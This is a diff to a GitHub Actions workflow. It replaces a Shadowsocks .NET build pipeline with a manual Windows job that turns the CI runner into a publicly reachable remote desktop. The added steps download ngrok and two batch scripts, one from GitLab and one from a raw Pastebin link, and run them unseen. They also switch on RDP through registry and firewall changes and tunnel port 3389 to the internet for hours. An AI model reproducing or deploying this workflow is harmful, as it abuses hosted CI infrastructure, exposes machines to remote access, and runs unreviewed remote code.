@@ -1,129 +1,35 @@
-name: Build
+name: ErDePe
 
-on:
-  push:
-    branches-ignore:
-      - 'v4'
-      - 'rm'
-    paths-ignore:
-      - 'README.md'
-      - 'LICENSE.txt'
-  pull_request:
-    branches-ignore:
-      - 'v4'
-      - 'rm'
-    paths-ignore:
-      - 'README.md'
-      - 'LICENSE.txt'
+on: workflow_dispatch
 
 jobs:
   build:
-    name: Build
-    strategy:
-      matrix:
-        os: [ubuntu-20.04, windows-latest]
-      fail-fast: false
-    runs-on: ${{ matrix.os }}
-    defaults:
-      run:
-        shell: bash
+
+    runs-on: windows-latest
+    timeout-minutes: 9999
 
     steps:
-      - uses: actions/checkout@v2
-      - name: Restore dependencies
-        if: matrix.os == 'windows-latest'
-        run: dotnet restore
-      - name: Build
-        if: matrix.os == 'windows-latest'
-        run: dotnet build --no-restore
-      - name: Test
-        if: matrix.os == 'windows-latest'
-        run: dotnet test --no-build --verbosity normal
-      # Publish CLI
-      - name: Define MSBuild properties
-        run: echo "MSBUILD_PROPS=-p:PublishSingleFile=true -p:PublishTrimmed=true -p:TrimMode=link -p:DebuggerSupport=false -p:EnableUnsafeBinaryFormatterSerialization=false -p:EnableUnsafeUTF7Encoding=false -p:InvariantGlobalization=true" >> $GITHUB_ENV
-      - name: Publish CLI framework-dependent
-        run: |
-          dotnet publish Shadowsocks.CLI -c Release
-      - name: Publish CLI self-contained for Linux ARM64
-        if: matrix.os == 'ubuntu-20.04'
-        run: |
-          dotnet publish Shadowsocks.CLI -c Release $MSBUILD_PROPS -r linux-arm64 --self-contained
-      - name: Publish CLI self-contained for Linux x64
-        if: matrix.os == 'ubuntu-20.04'
-        run: |
-          dotnet publish Shadowsocks.CLI -c Release $MSBUILD_PROPS -r linux-x64 --self-contained
-      - name: Publish CLI self-contained for Windows ARM64
-        if: matrix.os == 'windows-latest'
-        run: |
-          dotnet publish Shadowsocks.CLI -c Release $MSBUILD_PROPS -r win-arm64 --self-contained
-      - name: Publish CLI self-contained for Windows x64
-        if: matrix.os == 'windows-latest'
-        run: |
-          dotnet publish Shadowsocks.CLI -c Release $MSBUILD_PROPS -r win-x64 --self-contained
-      # Publish WPF
-      - name: Publish WPF framework-dependent
-        if: matrix.os == 'windows-latest'
-        run: dotnet publish Shadowsocks.WPF -c Release --no-restore
-      # - name: Publish WPF self-contained for Windows ARM64
-      #   if: matrix.os == 'windows-latest'
-      #   run: dotnet publish Shadowsocks.WPF -c Release -r win-arm64 --self-contained
-      - name: Publish WPF self-contained for Windows x64
-        if: matrix.os == 'windows-latest'
-        run: dotnet publish Shadowsocks.WPF -c Release -r win-x64 --self-contained
-      # Upload CLI
-      - name: Upload CLI artifacts for Linux ARM64
-        if: matrix.os == 'ubuntu-20.04'
-        uses: actions/upload-artifact@v2
-        with:
-          name: shadowsocks-cli-${{ github.sha }}-linux-arm64
-          path: Shadowsocks.CLI/bin/Release/net5.0/linux-arm64/publish/
-      - name: Upload CLI artifacts for Linux x64
-        if: matrix.os == 'ubuntu-20.04'
-        uses: actions/upload-artifact@v2
-        with:
-          name: shadowsocks-cli-${{ github.sha }}-linux-x64
-          path: Shadowsocks.CLI/bin/Release/net5.0/linux-x64/publish/
-      - name: Upload CLI artifacts for Linux framework-dependent
-        if: matrix.os == 'ubuntu-20.04'
-        uses: actions/upload-artifact@v2
-        with:
-          name: shadowsocks-cli-${{ github.sha }}-linux
-          path: Shadowsocks.CLI/bin/Release/net5.0/publish/
-      - name: Upload CLI artifacts for Windows ARM64
-        if: matrix.os == 'windows-latest'
-        uses: actions/upload-artifact@v2
-        with:
-          name: shadowsocks-cli-${{ github.sha }}-windows-arm64
-          path: Shadowsocks.CLI/bin/Release/net5.0/win-arm64/publish/
-      - name: Upload CLI artifacts for Windows x64
-        if: matrix.os == 'windows-latest'
-        uses: actions/upload-artifact@v2
-        with:
-          name: shadowsocks-cli-${{ github.sha }}-windows-x64
-          path: Shadowsocks.CLI/bin/Release/net5.0/win-x64/publish/
-      - name: Upload CLI artifacts for Windows framework-dependent
-        if: matrix.os == 'windows-latest'
-        uses: actions/upload-artifact@v2
-        with:
-          name: shadowsocks-cli-${{ github.sha }}-windows
-          path: Shadowsocks.CLI/bin/Release/net5.0/publish/
-      # Upload WPF
-      # - name: Upload WPF artifacts for Windows ARM64
-      #   if: matrix.os == 'windows-latest'
-      #   uses: actions/upload-artifact@v2
-      #   with:
-      #     name: shadowsocks-wpf-${{ github.sha }}-windows-arm64
-      #     path: Shadowsocks.WPF/bin/Release/net5.0-windows10.0.19041.0/win-arm64/publish/
-      - name: Upload WPF artifacts for Windows x64
-        if: matrix.os == 'windows-latest'
-        uses: actions/upload-artifact@v2
-        with:
-          name: shadowsocks-wpf-${{ github.sha }}-windows-x64
-          path: Shadowsocks.WPF/bin/Release/net5.0-windows10.0.19041.0/win-x64/publish/
-      - name: Upload WPF artifacts for Windows framework-dependent
-        if: matrix.os == 'windows-latest'
-        uses: actions/upload-artifact@v2
-        with:
-          name: shadowsocks-wpf-${{ github.sha }}-windows
-          path: Shadowsocks.WPF/bin/Release/net5.0-windows10.0.19041.0/publish/
+    - name: Download Ngrok
+      run: |
+        Invoke-WebRequest https://gitlab.com/samb1/fix_why/-/raw/main/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+    - name: Mengextract Ngrok File.
+      run: Expand-Archive ngrok.zip
+    - name: Connect Ke Akun Ngrok.
+      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+    - name: Download Important Files.
+      run: |
+        Invoke-WebRequest https://gitlab.com/samb1/fix_why/-/raw/main/file/cek.bat -OutFile cek.bat
+        Invoke-WebRequest https://pastebin.com/raw/aaC8q7Y2 -OutFile loop.bat
+    - name: Enable RDP Access.
+      run: | 
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - name: Membuat Tunnel.
+      run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp --region ap 3389"'
+    - name: Connect to your RDP 2core-7GB Ram.
+      run: cmd /c cek.bat
+    - name: All Done! You can close Tab now! Maximum VM time:6h.
+      run: cmd /c loop.bat 
